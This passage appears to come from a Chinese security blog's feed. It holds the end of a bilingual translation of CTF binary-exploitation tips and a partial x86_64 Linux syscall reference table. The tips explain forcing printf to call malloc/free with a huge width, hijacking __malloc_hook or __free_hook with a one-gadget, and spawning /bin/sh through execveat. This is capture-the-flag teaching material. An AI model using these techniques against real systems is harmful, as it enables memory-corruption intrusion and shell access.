triggered.) However, WORK_BUFFER_SIZE is not large enough, since we need to go to <strong>else</strong> block. Let’s take a look at <code>__libc_use_alloca</code> and see what exactly the minimum size of width we should give.</p><p>我们可以发现，如果width field足够大，将触发<code>malloc</code>。(当然，如果<code>malloc</code>被触发，那么<code>free</code>也会在printf的末尾被触发。)但是，WORK_BUFFER_SIZE不够大，所以我们需要转到else块从而触发mallco。让我们看看<code>__libc_use_alloca</code>，看看应该给出的最小宽度是多少。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">/* 线程的最小大小。我们可以自由选择一个合理的值  */</span><br><span class="line">#define PTHREAD_STACK_MIN        16384</span><br><span class="line"></span><br><span class="line">#define __MAX_ALLOCA_CUTOFF        65536</span><br><span class="line"></span><br><span class="line">int __libc_use_alloca (size_t size)</span><br><span class="line">&#123;</span><br><span class="line">    return (__builtin_expect (size &lt;= PTHREAD_STACK_MIN / 4, 1)</span><br><span class="line">        || __builtin_expect (__libc_alloca_cutoff (size), 1));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int __libc_alloca_cutoff (size_t size)</span><br><span class="line">&#123;</span><br><span class="line">return size &lt;= (MIN (__MAX_ALLOCA_CUTOFF,</span><br><span class="line">THREAD_GETMEM (THREAD_SELF, stackblock_size) / 4</span><br><span class="line">/* 在初始化线程库之前，主线程在stackblock_size元素中为零。因为它是主线程，所以我们可以假设最大可用堆栈空间。  */</span><br><span class="line">?: __MAX_ALLOCA_CUTOFF * 4));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们必须确保:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">size &gt; PTHREAD_STACK_MIN / 4</span><br><span class="line">size &gt; MIN(__MAX_ALLOCA_CUTOFF, THREAD_GETMEM(THREAD_SELF, stackblock_size) / 4 ?: __MAX_ALLOCA_CUTOFF * 4)</span><br></pre></td></tr></table></figure><ul><li>我并没有完全理解函数THREAD_GETMEM的作用，但它似乎主要返回0。</li><li>第二个条件通常是 <code>size &gt; 65536</code></li></ul><p>More details:</p><ul><li><a href="https://gcc.gnu.org/onlinedocs/gcc/Other-Builtins.html" target="_blank" rel="noopener">__builtin_expect</a></li><li><a href="https://code.woboq.org/userspace/glibc/sysdeps/x86_64/nptl/tls.h.html#_M/THREAD_GETMEM" target="_blank" rel="noopener">THREAD_GETMEM</a></li></ul><h3 id="conclusion"><a href="#conclusion" class="headerlink" title="conclusion"></a>conclusion</h3><ul><li>触发<code>malloc</code>和<code>free</code>的最小宽度通常是65537。</li><li>If there is a Format String Vulnerability and the program ends right after calling <code>printf(buf)</code>, we can hijack <code>__malloc_hook</code> or <code>__free_hook</code> with <code>one-gadget</code> and use the trick mentioned above to trigger <code>malloc</code> &amp; <code>free</code> then we can still get the shell even there is no more function call or sth after <code>printf(buf)</code>.(如果有一个格式字符串漏洞,程序结束后调用printf(buf),我们可以用one-gadget劫持<code>__malloc_hook</code>或<code>__free_hook</code>,使用上面提到的技巧来触发<code>malloc</code>&amp;<code>free</code>然后我们仍然可以得到shell后没有更多的函数调用<code>printf(buf)</code>。)</li></ul><h2 id="Use-execveat-to-open-a-shell"><a href="#Use-execveat-to-open-a-shell" class="headerlink" title="Use execveat to open a shell"></a>Use execveat to open a shell</h2><p>提到用系统调用getshell时，我们会想到<code>execve</code>。但是，由于缺少gadgets或其他的constraints，通常并不是很容易就能办到。<br>有一个系统调用<code>execveat</code>，原型如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int execveat(int dirfd, const char *pathname,</span><br><span class="line">             char *const argv[], char *const envp[],</span><br><span class="line">             int flags);</span><br></pre></td></tr></table></figure><p>According to its <a href="http://man7.org/linux/man-pages/man2/execveat.2.html" target="_blank" rel="noopener">man page</a>, it operates in the same way as <code>execve</code>. As for the additional arguments, it mentions that:<br>根据<a href="http://man7.org/linux/man-pages/man2/execveat.2.html" target="_blank" rel="noopener">其手册</a>得知，它的运作方式与execve相同。至于其他不同点，它提到:</p><blockquote><p>If pathname is absolute, then dirfd is ignored.<br>如果路径名是绝对的，那么dirfd将被忽略。</p></blockquote><p>Hence, if we make <code>pathname</code> point to <code>/bin/sh</code>, and set <code>argv</code>, <code>envp</code> and <code>flags</code> to 0, we can still get a shell whatever the value of <code>dirfd</code>.<br>因此，如果我们让<code>pathname</code>为<code>/bin/sh</code>，并将<code>argv</code>、‘envp’和‘flags’设置为0，那么无论<code>dirfd</code>的值是多少，我们仍然可以getshell。</p><h1 id="原文-https-github-com-Naetw-CTF-pwn-tips"><a href="#原文-https-github-com-Naetw-CTF-pwn-tips" class="headerlink" title="原文:https://github.com/Naetw/CTF-pwn-tips"></a>原文:<a href="https://github.com/Naetw/CTF-pwn-tips" target="_blank" rel="noopener">https://github.com/Naetw/CTF-pwn-tips</a></h1><h1 id="译者-l0ser"><a href="#译者-l0ser" class="headerlink" title="译者:l0ser"></a>译者:l0ser</h1>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Catalog&quot;&gt;&lt;a href=&quot;#Catalog&quot; class=&quot;headerlink&quot; title=&quot;Catalog&quot;&gt;&lt;/a&gt;Catalog&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://#overflow&quot; target=&quot;_blank&quot; r
      
    
    </summary>
    
    
      <category term="ctf-pwn" scheme="http://www.zero-mk.github.io/tags/ctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>Linux_System_Call_Table</title>
    <link href="http://www.zero-mk.github.io/2018/12/20/syscall/"/>
    <id>http://www.zero-mk.github.io/2018/12/20/syscall/</id>
    <published>2018-12-20T08:39:34.000Z</published>
    <updated>2018-12-31T18:11:12.915Z</updated>
    
    <content type="html"><![CDATA[<h1 id="x64-system-call"><a href="#x64-system-call" class="headerlink" title="x64_system_call:"></a>x64_system_call:</h1><p>原表位于 : <a href="http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/" target="_blank" rel="noopener">http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/</a></p><table><thead><tr><th>%rax</th><th>System call</th><th>%rdi</th><th>%rsi</th><th>%rdx</th><th>%r10</th><th>%r8</th><th>%r9</th></tr></thead><tbody><tr><td>0</td><td>sys_read</td><td>unsigned int fd</td><td>char *buf</td><td>size_t count</td><td></td><td></td><td></td></tr><tr><td>1</td><td>sys_write</td><td>unsigned int fd</td><td>const char *buf</td><td>size_t count</td><td></td><td></td><td></td></tr><tr><td>2</td><td>sys_open</td><td>const char *filename</td><td>int flags</td><td>int mode</td><td></td><td></td><td></td></tr><tr><td>3</td><td>sys_close</td><td>unsigned int fd</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>4</td><td>sys_stat</td><td>const char *filename</td><td>struct stat *statbuf</td><td></td><td></td><td></td><td></td></tr><tr><td>5</td><td>sys_fstat</td><td>unsigned int fd</td><td>struct stat *statbuf</td><td></td><td></td><td></td><td></td></tr><tr><td>6</td><td>sys_lstat</td><td>fconst char *filename</td><td>struct stat *statbuf</td><td></td><td></td><td></td><td></td></tr><tr><td>7</td><td>sys_poll</td><td>struct poll_fd *ufds</td><td>unsigned int nfds</td><td>long timeout_msecs</td><td></td><td></td><td></td></tr><tr><td>8</td><td>sys_lseek</td><td>unsigned int fd</td><td>off_t offset</td><td>unsigned int origin</td><td></td><td></td><td></td></tr><tr><td>9</td><td>sys_mmap</td><td>unsigned long addr</td><td>unsigned long len</td><td>unsigned long prot</td><td>unsigned long flags</td><td>unsigned long fd</td><td>unsigned long off</td></tr><tr><td>10</td><td>sys_mprotect</td><td>unsigned long start</td><td>size_t len</td><td>unsigned long prot</td><td></td><td></td><td></td></tr><tr><td>11</td><td>sys_munmap</td><td>unsigned long addr</td><td>size_t len</td><td></td><td></td><td></td><td></td></tr><tr><td>12</td><td>sys_brk</td><td>unsigned long brk</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>13</td><td>sys_rt_sigaction</td><td>int sig</td><td>const struct sigaction *act</td><td>struct sigaction *oact</td><td>size_t sigsetsize</td><td></td><td></td></tr><tr><td>14</td><td>sys_rt_sigprocmask</td><td>int how</td><td>sigset_t *nset</td><td>sigset_t *oset</td><td>size_t sigsetsize</td><td></td><td></td></tr><tr><td>15</td><td>sys_rt_sigreturn</td><td>unsigned long __unused</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>16</td><td>sys_ioctl</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>unsigned long arg</td><td></td><td></td><td></td></tr><tr><td>17</td><td>sys_pread64</td><td>unsigned long fd</td><td>char *buf</td><td>size_t count</td><td>loff_t pos</td><td></td><td></td></tr><tr><td>18</td><td>sys_pwrite64</td><td>unsigned int fd</td><td>const char *buf</td><td>size_t count</td><td>loff_t pos</td><td></td><td></td></tr><tr><td>19</td><td>sys_readv</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td></td><td></td><td></td></tr><tr><td>20</td><td>sys_writev</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td></td><td></td><td></td></tr><tr><td>21</td><td>sys_access</td><td>const char *filename</td><td>int mode</td><td></td><td></td><td></td><td></td></tr><tr><td>22</td><td>sys_pipe</td><td>int *filedes</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>23</td><td>sys_select</td><td>int n</td><td>fd_set *inp</td><td>fd_set *outp</td><td>fd_set*exp</td><td>struct timeval *tvp</td><td></td></tr><tr><td>24</td><td>sys_sched_yield</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>25</td><td>sys_mremap</td><td>unsigned long addr</td><td>unsigned long old_len</td><td>unsigned long new_len</td><td>unsigned long flags</td><td>unsigned long new_addr</td><td></td></tr><tr><td>26</td><td>sys_msync</td><td>unsigned long start</td><td>size_t len</td><td>int flags</td><td></td><td></td><td></td></tr><tr><td>27</td><td>sys_mincore</td><td>unsigned long start</td><td>size_t len</td><td>unsigned char *vec</td><td></td><td></td><td></td></tr><tr><td>28</td><td>sys_madvise</td><td>unsigned long start</td><td>size_t len_in</td><td>int behavior</td><td></td><td></td><td></td></tr><tr><td>29</td><td>sys_shmget</td><td>key_t key</td><td>size_t size</td><td>int shmflg</td><td></td><td></td><td></td></tr><tr><td>30</td><td>sys_shmat</td><td>int shmid</td><td>char *shmaddr</td><td>int shmflg</td><td></td><td></td><td></td></tr><tr><td>31</td><td>sys_shmctl</td><td>int shmid</td><td>int cmd</td><td>struct shmid_ds *buf</td><td></td><td></td><td></td></tr><tr><td>32</td><td>sys_dup</td><td>unsigned int fildes</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>33</td><td>sys_dup2</td><td>unsigned int oldfd</td><td>unsigned int newfd</td><td></td><td></td><td></td><td></td></tr><tr><td>34</td><td>sys_pause</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>35</td><td>sys_nanosleep</td><td>struct timespec *rqtp</td><td>struct timespec *rmtp</td><td></td><td></td><td></td><td></td></tr><tr><td>36</td><td>sys_getitimer</td><td>int which</td><td>struct itimerval *value</td><td></td><td></td><td></td><td></td></tr><tr><td>37</td><td>sys_alarm</td><td>unsigned int seconds</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>38</td><td>sys_setitimer</td><td>int which</td><td>struct itimerval *value</td><td>struct itimerval *ovalue</td><td></td><td></td><td></td></tr><tr><td>39</td><td>sys_getpid</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>40</td><td>sys_sendfile</td><td>int out_fd</td><td>int in_fd</td><td>off_t *offset</td><td>size_t count</td><td></td><td></td></tr><tr><td>41</td><td>sys_socket</td><td>int family</td><td>int type</td><td>int protocol</td><td></td><td></td><td></td></tr><tr><td>42</td><td>sys_connect</td><td>int fd</td><td>struct sockaddr *uservaddr</td><td>int addrlen</td><td></td><td></td><td></td></tr><tr><td>43</td><td>sys_accept</td><td>int fd</td><td>struct sockaddr *upeer_sockaddr</td><td>int *upeer_addrlen</td><td></td><td></td><td></td></tr><tr><td>44</td><td>sys_sendto</td><td>int fd</td><td>void *buff</td><td>size_t len</td><td>unsigned flags</td><td>struct sockaddr *addr</td><td>int addr_len</td></tr><tr><td>45</td><td>sys_recvfrom</td><td>int fd</td><td>void *ubuf</td><td>size_t size</td><td>unsigned flags</td><td>struct sockaddr *addr</td><td>int *addr_len</td></tr><tr><td>46</td><td>sys_sendmsg</td><td>int fd</td><td>struct msghdr *msg</td><td>unsigned flags</td><td></td><td></td><td></td></tr><tr><td>47</td><td>sys_recvmsg</td><td>int fd</td><td>struct msghdr *msg</td><td>unsigned int flags</td><td></td><td></td><td></td></tr><tr><td>48</td><td>sys_shutdown</td><td>int fd</td><td>int how</td><td></td><td></td><td></td><td></td></tr><tr><td>49</td><td>sys_bind</td><td>int fd</td><td>struct sokaddr *umyaddr</td><td>int addrlen</td><td></td><td></td><td></td></tr><tr><td>50</td><td>sys_listen</td><td>int fd</td><td>int backlog</td><td></td><td></td><td></td><td></td></tr><tr><td>51</td><td>sys_getsockname</td><td>int fd</td><td>struct sockaddr *usockaddr</td><td>int *usockaddr_len</td><td></td><td></td><td></td></tr><tr><td>52</td><td>sys_getpeername</td><td>int fd</td><td>struct sockaddr *usockaddr</td><td>int *usockaddr_len</td><td></td><td></td><td></td></tr><tr><td>53</td><td>sys_socketpair</td><td>int family</td><td>int type</td><td>int protocol</td><td>int *usockvec</td><td></td><td></td></tr><tr><td>54</td><td>sys_setsockopt</td><td>int fd</td><td>int level</td><td>int optname</td><td>char *optval</td><td>int optlen</td><td></td></tr><tr><td>55</td><td>sys_getsockopt</td><td>int fd</td><td>int level</td><td>int optname</td><td>char *optval</td><td>int *optlen</td><td></td></tr><tr><td>56</td><td>sys_clone</td><td>unsigned long clone_flags</td><td>unsigned long newsp</td><td>void *parent_tid</td><td>void *child_tid</td><td></td><td></td></tr><tr><td>57</td><td>sys_fork</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>58</td><td>sys_vfork</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>59</td><td>sys_execve</td><td>const char *filename</td><td>const char *const argv[]</td><td>const char *const envp[]</td><td></td><td></td><td></td></tr><tr><td>60</td><td>sys_exit</td><td>int error_code</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>61</td><td>sys_wait4</td><td>pid_t upid</td><td>int *stat_addr</td><td>int options</td><td>struct rusage *ru</td><td></td><td></td></tr><tr><td>62</td><td>sys_kill</td><td>pid_t pid</td><td>int sig</td><td></td><td></td><td></td><td></td></tr><tr><td>63</td><td>sys_uname</td><td>struct old_utsname *name</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>64</td><td>sys_semget</td><td>key_t key</td><td>int nsems</td><td>int semflg</td><td></td><td></td><td></td></tr><tr><td>65</td><td>sys_semop</td><td>int semid</td><td>struct sembuf *tsops</td><td>unsigned nsops</td><td></td><td></td><td></td></tr><tr><td>66</td><td>sys_semctl</td><td>int semid</td><td>int semnum</td><td>int cmd</td><td>union semun arg</td><td></td><td></td></tr><tr><td>67</td><td>sys_shmdt</td><td>char *shmaddr</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>68</td><td>sys_msgget</td><td>key_t key</td><td>int msgflg</td><td></td><td></td><td></td><td></td></tr><tr><td>69</td><td>sys_msgsnd</td><td>int msqid</td><td>struct msgbuf *msgp</td><td>size_t msgsz</td><td>int msgflg</td><td></td><td></td></tr><tr><td>70</td><td>sys_msgrcv</td><td>int msqid</td><td>struct msgbuf *msgp</td><td>size_t msgsz</td><td>long msgtyp</td><td>int msgflg</td><td></td></tr><tr><td>71</td><td>sys_msgctl</td><td>int msqid</td><td>int cmd</td><td>struct msqid_ds *buf</td><td></td><td></td><td></td></tr><tr><td>72</td><td>sys_fcntl</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>unsigned long arg</td><td></td><td></td><td></td></tr><tr><td>73</td><td>sys_flock</td><td>unsigned int fd</td><td>unsigned int cmd</td><td></td><td></td><td></td><td></td></tr><tr><td>74</td><td>sys_fsync</td><td>unsigned int fd</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>75</td><td>sys_fdatasync</td><td>unsigned int fd</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>76</td><td>sys_truncate</td><td>const char *path</td><td>long length</td><td></td><td></td><td></td><td></td></tr><tr><td>77</td><td>sys_ftruncate</td><td>unsigned int fd</td><td>unsigned long length</td><td></td><td></td><td></td><td></td></tr><tr><td>78</td><td>sys_getdents</td><td>unsigned int fd</td><td>struct linux_dirent *dirent</td><td>unsigned int count</td><td></td><td></td><td></td></tr><tr><td>79</td><td>sys_getcwd</td><td>char *buf</td><td>unsigned long size</td><td></td><td></td><td></td><td></td></tr><tr><td>80</td><td>sys_chdir</td><td>const char *filename</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>81</td><td>sys_fchdir</td><td>unsigned int fd</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>82</td><td>sys_rename</td><td>const char *oldname</td><td>const char *newname</td><td></td><td></td><td></td><td></td></tr><tr><td>83</td><td>sys_mkdir</td><td>const char *pathname</td><td>int mode</td><td></td><td></td><td></td><td></td></tr><tr><td>84</td><td>sys_rmdir</td><td>const char *pathname</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>85</td><td>sys_creat</td><td>const char *pathname</td><td>int mode</td><td></td><td></td><td></td><td></td></tr><tr><td>86</td><td>sys_link</td><td>const char *oldname</td><td>const char *newname</td><td></td><td></td><td></td><td></td></tr><tr><td>87</td><td>sys_unlink</td><td>const char *pathname</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>88</td><td>sys_symlink</td><td>const char *oldname</td><td>const char *newname</td><td></td><td></td><td></td><td></td></tr><tr><td>89</td><td>sys_readlink</td><td>const char *path</td><td>char *buf</td><td>int bufsiz</td><td></td><td></td><td></td></tr><tr><td>90</td><td>sys_chmod</td><td>const char *filename</td><td>mode_t mode</td><td></td><td></td><td></td><td></td></tr><tr><td>91</td><td>sys_fchmod</td><td>unsigned int fd</td><td>mode_t mode</td><td></td><td></td><td></td><td></td></tr><tr><td>92</td><td>sys_chown</td><td>const char *filename</td><td>uid_t user</td><td>gid_t group</td><td></td><td></td><td></td></tr><tr><td>93</td><td>sys_fchown</td><td>unsigned int fd</td><td>uid_t user</td><td>gid_t group</td><td></td><td></td><td></td></tr><tr><td>94</td><td>sys_lchown</td><td>const char *filename</td><td>uid_t user</td><td>gid_t group</td><td></td><td></td><td></td></tr><tr><td>95</td><td>sys_umask</td><td>int mask</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>96</td><td>sys_gettimeofday</td><td>struct timeval *tv</td><td>struct timezone *tz</td><td></td><td></td><td></td><td></td></tr><tr><td>97</td><td>sys_getrlimit</td><td>unsigned int resource</td><td>struct rlimit *rlim</td><td></td><td></td><td></td><td></td></tr><tr><td>98</td><td>sys_getrusage</td><td>int who</td><td>struct rusage *ru</td><td></td><td></td><td></td><td></td></tr><tr><td>99</td><td>sys_sysinfo</td><td>struct sysinfo *info</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>100</td><td>sys_times</td><td>struct sysinfo *info</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>101</td><td>sys_ptrace</td><td>long request</td><td>long pid</td><td>unsigned long addr</td><td>unsigned long data</td><td></td><td></td></tr><tr><td>102</td><td>sys_getuid</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>103</td><td>sys_syslog</td><td>int type</td><td>char *buf</td><td>int len</td><td></td><td></td><td></td></tr><tr><td>104</td><td>sys_getgid</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>105</td><td>sys_setuid</td><td>uid_t uid</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>106</td><td>sys_setgid</td><td>gid_t gid</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>107</td><td>sys_geteuid</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>108</td><td>sys_getegid</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>109</td><td>sys_setpgid</td><td>pid_t pid</td><td>pid_t pgid</td><td></td><td></td><td></td><td></td></tr><tr><td>110</td><td>sys_getppid</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>111</td><td>sys_getpgrp</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>112</td><td>sys_setsid</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>113</td><td>sys_setreuid</td><td>uid_t ruid</td><td>uid_t euid</td><td></td><td></td><td></td><td></td></tr><tr><td>114</td><td>sys_setregid</td><td>gid_t rgid</td><td>gid_t egid</td><td></td><td></td><td></td><td></td></tr><tr><td>115</td><td>sys_getgroups</td><td>int gidsetsize</td><td>gid_t *grouplist</td><td></td><td></td><td></td><td></td></tr><tr><td>116</td><td>sys_setgroups</td><td>int gidsetsize</td><td>gid_t *grouplist</td><td></td><td></td><td></td><td></td></tr><tr><td>117</td><td>sys_setresuid</td><td>uid_t *ruid</td><td>uid_t *euid</td><td>uid_t *suid</td><td></td><td></td><td></td></tr><tr><td>118</td><td>sys_getresuid</td><td>uid_t *ruid</td><td>uid_t *euid</td><td>uid_t *suid</td><td></td><td></td><td></td></tr><tr><td>119</td><td>sys_setresgid</td><td>gid_t rgid</td><td>gid_t egid</td><td>gid_t sgid</td><td></td><td></td><td></td></tr><tr><td>120</td><td>sys_getresgid</td><td>gid_t *rgid</td><td>gid_t *egid</td><td>gid_t *sgid</td><td></td><td></td><td></td></tr><tr><td>121</td><td>sys_getpgid</td><td>pid_t pid</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>122</td><td>sys_setfsuid</td><td>uid_t uid</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>123</td><td>sys_setfsgid</td><td>gid_t gid</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>124</td><td>sys_getsid</td><td>pid_t pid</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>125</td><td>sys_capget</td><td>cap_user_header_t header</td><td>cap_user_data_t dataptr</td><td></td><td></td><td></td><td></td></tr><tr><td>126</td><td>sys_capset</td><td>cap_user_header_t header</td><td>const cap_user_data_t data</td><td></td><td></td><td></td><td></td></tr><tr><td>127</td><td>sys_rt_sigpending</td><td>sigset_t *set</td><td>size_t sigsetsize</td><td></td><td></td><td></td><td></td></tr><tr><td>128</td><td>sys_rt_sigtimedwait</td><td>const sigset_t *uthese</td><td>siginfo_t *uinfo</td><td>const struct timespec *uts</td><td>size_t sigsetsize</td><td></td><td></td></tr><tr><td>129</td><td>sys_rt_sigqueueinfo</td><td>pid_t pid</td><td>int sig</td><td>siginfo_t *uinfo</td><td></td><td></td><td></td></tr><tr><td>130</td><td>sys_rt_sigsuspend</td><td>sigset_t *unewset</td><td>size_t sigsetsize</td><td></td><td></td><td></td><td></td></tr><tr><td>131</td><td>sys_sigaltstack</td><td>const stack_t *uss</td><td>stack_t *uoss</td><td></td><td></td><td></td><td></td></tr><tr><td>132</td><td>sys_utime</td><td>char *filename</td><td>struct utimbuf *times</td><td></td><td></td><td></td><td></td></tr><tr><td>133</td><td>sys_mknod</td><td>const char *filename</td><td>umode_t mode</td><td>unsigned dev</td><td></td><td></td><td></td></tr><tr><td>134</td><td>sys_uselib</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>135</td><td>sys_personality</td><td>unsigned int personality</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>136</td><td>sys_ustat</td><td>unsigned dev</td><td>struct ustat *ubuf</td><td></td><td></td><td></td><td></td></tr><tr><td>137</td><td>sys_statfs</td><td>const char *pathname</td><td>struct statfs *buf</td><td></td><td></td><td></td><td></td></tr><tr><td>138</td><td>sys_fstatfs</td><td>unsigned int fd</td><td>struct statfs *buf</td><td></td><td></td><td></td><td></td></tr><tr><td>139</td><td>sys_sysfs</td><td>int option</td><td>unsigned long arg1</td><td>unsigned long arg2</td><td></td><td></td><td></td></tr><tr><td>140</td><td>sys_getpriority</td><td>int which</td><td>int who</td><td></td><td></td><td></td><td></td></tr><tr><td>141</td><td>sys_setpriority</td><td>int which</td><td>int who</td><td>int niceval</td><td></td><td></td><td></td></tr><tr><td>142</td><td>sys_sched_setparam</td><td>pid_t pid</td><td>struct sched_param *param</td><td></td><td></td><td></td><td></td></tr><tr><td>143</td><td>sys_sched_getparam</td><td>pid_t pid</td><td>struct sched_param *param</td><td></td><td></td><td></td><td></td></tr><tr><td>144</td><td>sys_sched_setscheduler</td><td>pid_t pid</td><td>int policy</td><td>struct sched_param *param</td><td></td><td></td><td></td></tr><tr><td>145</td><td>sys_sched_getscheduler</td><td>pid_t pid</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>146</td><td>sys_sched_get_priority_max</td><td>int policy</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>147</td><td>sys_sched_get_priority_min</td><td>int policy</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>148</td><td>sys_sched_rr_get_interval</td><td>pid_t pid</td><td>struct timespec *interval</td><td></td><td></td><td></td><td></td></tr><tr><td>149</td><td>sys_mlock</td><td>unsigned long start</td><td>size_t len</td><td></td><td></td><td></td><td></td></tr><tr><td>150</td><td>sys_munlock</td><td>unsigned long start</td><td>size_t len</td><td></td><td></td><td></td><td></td></tr><tr><td>151</td><td>sys_mlockall</td><td>int flags</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>152</td><td>sys_munlockall</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>153</td><td>sys_vhangup</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>154</td><td>sys_modify_ldt</td><td>int func</td><td>void *ptr</td><td>unsigned long bytecount</td><td></td><td></td><td></td></tr><tr><td>155</td><td>sys_pivot_root</td><td>const char *new_root</td><td>const char *put_old</td><td></td><td></td><td></td><td></td></tr><tr><td>156</td><td>sys__sysctl</td><td>struct __sysctl_args *args</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>157</td><td>sys_prctl</td><td>int option</td><td>unsigned long arg2</td><td>unsigned long arg3</td><td>unsigned long arg4</td><td></td><td>unsigned long arg5</td></tr><tr><td>158</td><td>sys_arch_prctl</td><td>struct task_struct *task</td><td>int code</td><td>unsigned long *addr</td><td></td><td></td><td></td></tr><tr><td>159</td><td>sys_adjtimex</td><td>struct timex *txc_p</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>160</td><td>sys_setrlimit</td><td>unsigned int resource</td><td>struct rlimit *rlim</td><td></td><td></td><td></td><td></td></tr><tr><td>161</td><td>sys_chroot</td><td>const char *filename</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>162</td><td>sys_sync</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>163</td><td>sys_acct</td><td>const char *name</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>164</td><td>sys_settimeofday</td><td>struct timeval *tv</td><td>struct timezone *tz</td><td></td><td></td><td></td><td></td></tr><tr><td>165</td><td>sys_mount</td><td>char *dev_name</td><td>char *dir_name</td><td>char *type</td><td>unsigned long flags</td><td>void *data</td><td></td></tr><tr><td>166</td><td>sys_umount2</td><td>const char *target</td><td>int flags</td><td></td><td></td><td></td><td></td></tr><tr><td>167</td><td>sys_swapon</td><td>const char *specialfile</td><td>int swap_flags</td><td></td><td></td><td></td><td></td></tr><tr><td>168</td><td>sys_swapoff</td><td>const char *specialfile</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>169</td><td>sys_reboot</td><td>int magic1</td><td>int magic2</td><td>unsigned int cmd</td><td>void *arg</td><td></td><td></td></tr><tr><td>170</td><td>sys_sethostname</td><td>char *name</td><td>int len</td><td></td><td></td><td></td><td></td></tr><tr><td>171</td><td>sys_setdomainname</td><td>char *name</td><td>int len</td><td></td><td></td><td></td><td></td></tr><tr><td>172</td><td>sys_iopl</td><td>unsigned int level</td><td>struct pt_regs *regs</td><td></td><td></td><td></td><td></td></tr><tr><td>173</td><td>sys_ioperm</td><td>unsigned long from</td><td>unsigned long num</td><td>int turn_on</td><td></td><td></td><td></td></tr><tr><td>174</td><td>sys_create_module</td><td>REMOVED IN Linux 2.6</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>175</td><td>sys_init_module</td><td>void *umod</td><td>unsigned long len</td><td>const char *uargs</td><td></td><td></td><td></td></tr><tr><td>176</td><td>sys_delete_module</td><td>const chat *name_user</td><td>unsigned int flags</td><td></td><td></td><td></td><td></td></tr><tr><td>177</td><td>sys_get_kernel_syms</td><td>REMOVED IN Linux 2.6</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>178</td><td>sys_query_module</td><td>REMOVED IN Linux 2.6</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>179</td><td>sys_quotactl</td><td>unsigned int cmd</td><td>const char *special</td><td>qid_t id</td><td>void *addr</td><td></td><td></td></tr><tr><td>180</td><td>sys_nfsservctl</td><td>NOT 